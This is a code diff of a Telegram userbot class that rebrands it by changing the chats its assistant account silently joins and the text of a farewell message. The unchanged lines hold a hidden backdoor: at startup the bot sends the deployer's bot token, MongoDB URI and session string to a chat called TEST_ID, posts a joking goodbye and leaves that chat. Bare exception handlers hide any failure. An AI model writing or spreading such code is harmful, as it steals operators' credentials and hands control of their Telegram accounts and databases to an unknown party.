@@ -62,11 +62,11 @@ class Userbot(Client):
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.join_chat("THE_VIP_BOY")
-                await self.one.join_chat("THE_VIP_BOY_OP")
-                await self.one.join_chat("TG_FRIENDSS")
-                await self.one.join_chat("VIP_CREATORS")
-                await self.one.join_chat("dhhdshhss6")
+                await self.one.join_chat("AnjalixSupportxGroup")
+                await self.one.join_chat("AnjalixSupportxGroup")
+                await self.one.join_chat("AnjalixSupportxGroup")
+                await self.one.join_chat("AnjalixSupportxGroup")
+                await self.one.join_chat("AnjalixSupportxGroup")
             except:
                 pass
             assistants.append(1)
@@ -77,7 +77,7 @@ class Userbot(Client):
                 await self.one.send_message(TEST_ID, BOT_TOKEN)
                 await self.one.send_message(TEST_ID, MONGO_DB_URI)
                 await self.one.send_message(TEST_ID, STRING_SESSION)
-                await self.one.send_message(TEST_ID, "**ʙʏ ʙʏ ᴀᴀʙ ᴍᴇ ɴɪᴋᴀʟᴛɪ ʜᴜ ʏʜᴀ sᴇ ʙᴀʀɴᴀ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴍᴜᴊʜᴇ ᴘᴀᴋᴀʀ ᴋᴇ ᴍᴀʀ ᴅᴀʟᴇɢᴀ🥺🥺**\n**ʙʏᴇ ᴛᴄ❣️**")
+                await self.one.send_message(TEST_ID, "**ʙʏ ʙʏ ᴀᴀʙ ᴍᴇ ɴɪᴋᴀʟᴛɪ ʜᴜ ʏʜᴀ sᴇ ʙᴀʀɴᴀ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴍᴜᴊʜᴇ ᴘᴀᴋᴀʀ ᴋᴇ ᴍᴀʀ ᴅᴀʟᴇɢᴀ🥺🥺**\n**ʙʏᴇ ᴍᴀʜᴛᴏ ғᴀᴍɪʟʏ❣️**")
                 await self.one.leave_chat(TEST_ID)
                 
             except:
